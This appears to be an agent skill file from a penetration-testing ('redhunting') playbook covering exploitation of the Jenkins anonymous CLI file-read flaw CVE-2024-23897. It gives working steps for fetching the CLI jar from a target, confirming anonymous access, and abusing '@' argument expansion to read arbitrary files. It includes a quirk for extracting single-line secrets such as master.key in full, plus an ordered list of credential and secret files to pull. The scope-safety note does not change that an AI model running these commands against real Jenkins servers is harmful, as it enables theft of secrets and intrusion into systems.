---
name: rh-class-jenkins-cli
description: >-
  Class 17 of the redhunting attack playbook: Jenkins Anonymous CLI. Loaded by the Confirm
  phase when the lead board routes a lead of this class. Pair it with the
  command-level depth in cheatsheets/http.md and close every
  claim through the verification ladders in verification.md.
triggers: jenkins cli
---

## 17. Jenkins Anonymous CLI (CVE-2024-23897 in practice: protocol notes that save an hour)

Signal: an internet-reachable Jenkins with X-Jenkins version <=2.441; the CLI channel (jnlpJars/jenkins-cli.jar) served anonymously.

Detection workflow: the duplex CLI channel is finicky; the mechanics below are the working path (they saved an hour on the real engagement).

PROOF BAR: the who-am-i anonymous transcript, the file-read echo pair per requested path, and the existence-oracle negative on a nonexistent path; single-line files read fully via the dummy-argument form. Reading master.key WITHOUT decrypting credentials.xml keeps the disclosure rotation-safe.

The duplex CLI channel is finicky; working mechanics:
- Handshake: curl_cffi/requests CANNOT speak it cleanly (the download side streams and hangs). Use the real client jar served by the target: GET /jnlpJars/jenkins-cli.jar -> java -jar jenkins-cli.jar -s http://host/ who-am-i. who-am-i works for anonymous (authorities: ["anonymous"]) = CLI channel open.
- Read primitives via @-argument expansion (server-side, fixed 2.442): `help "@/etc/passwd"` echoes file lines in the "Too many arguments: <line>" / "(default: <line>)" error pair (2 lines per request); `help x "@/path"` (dummy first arg) echoes SINGLE-LINE files fully - that extracted a 210-hex-char master.key verbatim; nonexistent path -> "No such file: <path>" = existence oracle (perfect negative control).
- ECHO-FORM QUIRK: single-line files (master.key, /proc/self/cmdline, /etc/environment) MUST be read as `help x @/file`. Plain `help @file` makes the single expanded line the COMMAND-NAME argument -> command lookup -> "You must authenticate". Two+ expanded args take the anonymous echo path.
- Files worth pulling in order: /etc/passwd, JENKINS_HOME from /proc/self/environ, $JENKINS_HOME/secrets/master.key, secrets/hudson.util.Secret, credentials.xml (presence alone proves the encrypted store), jobs/*/config.xml (build scripts with injected secrets). Multi-line text files yield only the first 2 lines per request; binary files arrive mangled (UTF-8 replacement) - document these limits as the honest chain-matrix boundary.
- connect-node and most commands need Overall/Read; help is the anonymous one - do not burn the lead on commands that 403. Version from the X-Jenkins response header; <=2.441 is vulnerable.
- Scope-safety note: reading master.key WITHOUT decrypting credentials.xml keeps the disclosure rotation-safe; decrypt only when the target explicitly asks.
